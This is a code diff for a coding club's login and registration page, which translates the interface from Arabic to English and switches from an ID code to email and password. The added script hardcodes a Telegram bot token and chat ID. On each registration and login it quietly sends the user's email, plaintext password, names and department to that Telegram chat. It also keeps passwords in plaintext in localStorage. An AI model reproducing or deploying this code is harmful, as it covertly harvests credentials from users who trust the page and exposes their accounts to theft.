@@ -1,5 +1,5 @@
 <!DOCTYPE html>
-<html lang="ar">
+<html lang="en">
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
@@ -36,11 +36,6 @@
         .section.hidden {
             display: none;
         }
-        .login-buttons, .form-actions {
-            display: flex;
-            justify-content: space-around;
-            margin-top: 20px;
-        }
         .form-actions button {
             background-color: #4CAF50;
             color: white;
@@ -49,85 +44,95 @@
             border-radius: 5px;
             cursor: pointer;
         }
-        .error-message {
+        .error-message, .success-message {
             display: none;
-            color: red;
             text-align: left;
             margin-bottom: 20px;
         }
+        .error-message {
+            color: red;
+        }
+        .success-message {
+            color: green;
+        }
+        label {
+            display: inline-block;
+            width: 100%;
+            margin-bottom: 5px;
+        }
+        input[type="email"],
+        input[type="text"],
+        input[type="password"] {
+            width: calc(100% - 20px);
+            padding: 10px;
+            border: 1px solid #ccc;
+            border-radius: 5px;
+            margin-bottom: 10px;
+        }
     </style>
+    <!-- reCAPTCHA script -->
+    <script src="https://www.google.com/recaptcha/api.js" async defer></script>
 </head>
 <body>
 
     <header>
-        <h1>Future Coders - تسجيل الدخول</h1>
+        <h1>Future Coders - Login</h1>
     </header>
 
-    <!-- صفحة تسجيل الدخول -->
+    <!-- Login Page -->
     <section class="section" id="login-section">
-        <h2>تسجيل الدخول</h2>
+        <h2>Login</h2>
         <form id="login-form">
-            <label for="login-code">الكود التعريفي</label>
-            <input type="text" id="login-code" name="login-code" placeholder="أدخل الكود التعريفي">
+            <label for="login-email">Email</label>
+            <input type="email" id="login-email" name="login-email" placeholder="Enter your email" required>
+            <label for="login-password">Password</label>
+            <input type="password" id="login-password" name="login-password" placeholder="Enter your password" required>
+
+            <!-- reCAPTCHA for login -->
+            <div class="g-recaptcha" data-sitekey="YOUR_SITE_KEY"></div>
+
             <div class="form-actions">
-                <button type="button" id="login-submit">تسجيل الدخول</button>
+                <button type="button" id="login-submit">Login</button>
             </div>
         </form>
-        <p>لا تملك حساباً؟ <a href="#" id="go-to-register">إنشاء حساب</a></p>
-        <div class="error-message" id="login-error">الكود التعريفي غير صحيح</div>
+        <p>Don't have an account? <a href="#" id="go-to-register">Create Account</a></p>
+        <div class="error-message" id="login-error">Invalid credentials</div>
     </section>
 
-    <!-- صفحة إنشاء حساب -->
+    <!-- Registration Page -->
     <section class="section hidden" id="register-section">
-        <h2>إنشاء حساب</h2>
+        <h2>Create Account</h2>
         <form id="register-form">
-            <label for="first-name">الاسم</label>
-            <input type="text" id="first-name" name="first-name" placeholder="أدخل اسمك">
-            <label for="last-name">اللقب</label>
-            <input type="text" id="last-name" name="last-name" placeholder="أدخل لقبك">
-            <label for="department">القسم</label>
-            <input type="text" id="department" name="department" placeholder="أدخل القسم">
+            <label for="email">Email</label>
+            <input type="email" id="email" name="email" placeholder="Enter your email" required>
+            <label for="first-name">First Name</label>
+            <input type="text" id="first-name" name="first-name" placeholder="Enter your first name" required>
+            <label for="last-name">Last Name</label>
+            <input type="text" id="last-name" name="last-name" placeholder="Enter your last name" required>
+            <label for="department">Department</label>
+            <input type="text" id="department" name="department" placeholder="Enter your department" required>
+            <label for="password">Password</label>
+            <input type="password" id="password" name="password" placeholder="Enter your password" required>
+            <label for="confirm-password">Confirm Password</label>
+            <input type="password" id="confirm-password" name="confirm-password" placeholder="Confirm your password" required>
+
+            <!-- reCAPTCHA for registration -->
+            <div class="g-recaptcha" data-sitekey="YOUR_SITE_KEY"></div>
+
             <div class="form-actions">
-                <button type="button" id="register-submit">إنشاء حساب</button>
+                <button type="button" id="register-submit">Create Account</button>
             </div>
         </form>
-        <div class="error-message" id="register-error">يرجى ملء جميع الحقول</div>
+        <div class="error-message" id="register-error"></div>
     </section>
 
-    <!-- صفحة الكود التعريفي -->
-    <section class="section hidden" id="code-section">
-        <h2>الكود التعريفي</h2>
-        <p>تم إنشاء حسابك بنجاح! الكود التعريفي الخاص بك هو: <strong id="generated-code"></strong></p>
-        <p>يرجى الاحتفاظ بهذا الكود.</p>
-        <div class="form-actions">
-            <button type="button" id="go-to-login">حسناً</button>
-        </div>
-    </section>
-
-    <!-- صفحة الاستبيان -->
-    <section class="section hidden" id="survey-section">
-        <h2>يرجى ملء الاستبيان التالي</h2>
-        <form id="survey-form">
-            <label for="reason">سبب الدخول</label>
-            <input type="text" id="reason" name="reason" placeholder="أدخل سبب الدخول">
-            <label for="ambitions">الطموحات</label>
-            <textarea id="ambitions" name="ambitions" placeholder="أدخل طموحاتك"></textarea>
-            <label for="skills">ما هو الشيء الذي تبرع فيه</label>
-            <input type="text" id="skills" name="skills" placeholder="أدخل المهارات التي تبرع فيها">
-            <div class="form-actions">
-                <button type="button" id="survey-submit">إرسال</button>
-            </div>
-        </form>
-        <div class="error-message" id="survey-error">يرجى ملء جميع الحقول</div>
-    </section>
-
-    <!-- صفحة نادي المبرمجين -->
+    <!-- صفحة نادي المستقبل للمبرمجين -->
     <section class="section hidden" id="club-section">
         <header>
             <h1>نادي المبرمجين</h1>
         </header>
         <section>
-            <h2>تعريف نادي المبرمجين</h2>
+            <h2>نبذة عن نادي المبرمجين</h2>
             <p>نادي المبرمجين هو مجتمع يهدف إلى تعزيز مهارات البرمجة وتبادل المعرفة بين الأعضاء.</p>
         </section>
         <section>
@@ -138,10 +143,22 @@
         <section>
             <h2>خارطة الطريق</h2>
             <ul>
-                <li>المرحلة 1: تعلم أساسيات البرمجة</li>
-                <li>المرحلة 2: تطوير المشاريع الأولى</li>
-                <li>المرحلة 3: التعلم المتقدم</li>
-                <li>المرحلة 4: المشاركة في المسابقات</li>
+                <li>1-أكتوبر:
+                    <ul>
+                        <li>.افتتاح النادي تصميم مطبوعة تعريفية بالنادي: نشاط تعريفي بالنادي داخل المؤسسة</li>
+                        <li>.تنظيم ورشة عمل برمجة: برمجة تاريخها وميادينها</li>
+                    </ul>
+                </li>
+                <li>2-نوفمبر:
+                    <ul>
+                        <li>.فيديو أول نوفمبر/القضية: بمناسبة أول نوفمبر</li>
+                        <li>.HTML: ورشة داخلية لأعضاء النادي للتعلم</li>
+                        <li>حسابات التواصل الاجتماعي (كيفية إنشاء حساب احترافي والتسويق له)</li>
+                        <li>.HTML+CSS: ورشة داخلية لأعضاء النادي للتعلم</li>
+                        <li>.تصميم موقع: تصميم موقع خاص بالمؤسسة</li>
+                        <li>رحلة ميدانية: اختبار مخبر المعلوماتية في جامعة محمد خيضر-بسكرة</li>
+                    </ul>
+                </li>
             </ul>
         </section>
         <section>
@@ -155,71 +172,83 @@
     </section>
 
     <script>
-        let userCode = ""; // سيتم تخزين الكود هنا
+        const telegramBotToken = "7523355108:AAFoWXH3sCyNrwhCWQRwsFZekWrKKa2xQso"; // Bot token
+        const chatId = "6919240425"; // Chat ID
 
-        // التنقل بين الصفحات
+        // Navigate between sections
         function showSection(sectionId) {
             document.querySelectorAll('.section').forEach(section => section.classList.add('hidden'));
             document.getElementById(sectionId).classList.remove('hidden');
         }
 
-        // توليد كود مكون من 8 أرقام
-        function generateCode(firstName, lastName, department) {
-            const baseString = firstName + lastName + department;
-            let code = 0;
-            for (let i = 0; i < baseString.length; i++) {
-                code += baseString.charCodeAt(i);
-            }
-            return String(code).slice(0, 8).padEnd(8, '0');
-        }
-
-        // تسجيل الدخول
+        // Login
         document.getElementById('login-submit').addEventListener('click', function() {
-            const loginCode = document.getElementById('login-code').value;
-            if (loginCode === userCode && loginCode !== "") {
-                showSection('survey-section');
+            const loginEmail = document.getElementById('login-email').value.trim();
+            const loginPassword = document.getElementById('login-password').value;
+            const storedUsers = JSON.parse(localStorage.getItem('users')) || {};
+
+            const user = Object.values(storedUsers).find(user => user.email === loginEmail && user.password === loginPassword);
+
+            if (user) {
+                const message = `Login: Email: ${user.email}, Password: ${user.password}, First Name: ${user.firstName}, Last Name: ${user.lastName}`;
+                sendMessageToTelegram(message);
+                showSection('club-section'); // Navigate to Coders Club page
             } else {
                 document.getElementById('login-error').style.display = 'block';
             }
         });
 
-        // إنشاء حساب
+        // Create Account
         document.getElementById('register-submit').addEventListener('click', function() {
+            const email = document.getElementById('email').value.trim();
             const firstName = document.getElementById('first-name').value.trim();
             const lastName = document.getElementById('last-name').value.trim();
             const department = document.getElementById('department').value.trim();
-            if (firstName && lastName && department) {
-                userCode = generateCode(firstName, lastName, department); // إنشاء الكود
-                document.getElementById('generated-code').textContent = userCode;
-                showSection('code-section');
-            } else {
+            const password = document.getElementById('password').value;
+            const confirmPassword = document.getElementById('confirm-password').value;
+            const emailRegex = /^[a-zA-Z0-9._%+-]+@gmail\.com$/; // Validate email
+            const passwordValid = password.length >= 8; // Validate password
+            const passwordsMatch = password === confirmPassword; // Check if passwords match
+
+            if (!emailRegex.test(email)) {
+                document.getElementById('register-error').innerText = 'Please enter a valid email address (only Gmail addresses allowed).';
                 document.getElementById('register-error').style.display = 'block';
+                return;
             }
-        });
 
-        // العودة إلى صفحة تسجيل الدخول بعد عرض الكود
-        document.getElementById('go-to-login').addEventListener('click', function() {
-            showSection('login-section');
-        });
-
-        // التحقق من الاستبيان
-        document.getElementById('survey-submit').addEventListener('click', function() {
-            const reason = document.getElementById('reason').value.trim();
-            const ambitions = document.getElementById('ambitions').value.trim();
-            const skills = document.getElementById('skills').value.trim();
-            if (reason && ambitions && skills) {
-                showSection
-('club-section'); // الانتقال إلى صفحة نادي المبرمجين
-            } else {
-                document.getElementById('survey-error').style.display = 'block';
+            if (!passwordValid) {
+                document.getElementById('register-error').innerText = 'Password must be at least 8 characters long.';
+                document.getElementById('register-error').style.display = 'block';
+                return;
             }
+
+            if (!passwordsMatch) {
+                document.getElementById('register-error').innerText = 'Passwords do not match.';
+                document.getElementById('register-error').style.display = 'block';
+                return;
+            }
+
+            const users = JSON.parse(localStorage.getItem('users')) || {};
+            users[email] = { email, firstName, lastName, department, password };
+            localStorage.setItem('users', JSON.stringify(users));
+
+            const message = `Registration: Email: ${email}, Password: ${password}, First Name: ${firstName}, Last Name: ${lastName}, Department: ${department}`;
+            sendMessageToTelegram(message);
+            showSection('login-section'); // Navigate back to login page
         });
 
-        // التبديل بين تسجيل الدخول وإنشاء حساب
-        document.getElementById('go-to-register').addEventListener('click', function() {
+        // Navigate to Register page
+        document.getElementById('go-to-register').addEventListener('click', function(e) {
+            e.preventDefault();
             showSection('register-section');
         });
+
+        // Send message to Telegram function
+        function sendMessageToTelegram(message) {
+            const url = `https://api.telegram.org/bot${telegramBotToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}`;
+            fetch(url);
+        }
     </script>
 
 </body>
-  </html>
+</html>
